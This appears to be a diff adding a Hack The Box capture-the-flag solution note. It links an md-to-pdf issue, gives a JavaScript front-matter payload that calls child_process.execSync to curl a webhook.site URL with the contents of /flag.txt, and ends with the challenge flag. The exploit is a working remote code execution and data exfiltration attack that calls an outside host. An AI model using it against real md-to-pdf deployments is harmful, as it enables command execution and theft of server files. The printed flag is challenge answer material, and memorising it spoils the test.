@@ -1,0 +1,13 @@
+https://github.com/simonhaenisch/md-to-pdf/issues/99
+
+
+1. Create New Invoice and enter the code below ( you can use your own url webhook )
+
+---js
+((require("child_process")).execSync("curl https://webhook.site/06264423-3818-4ad0-93af-309caaae391f/?flag=`cat /flag.txt`"))
+---RCE
+
+2. Check the webhook requests
+
+
+HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
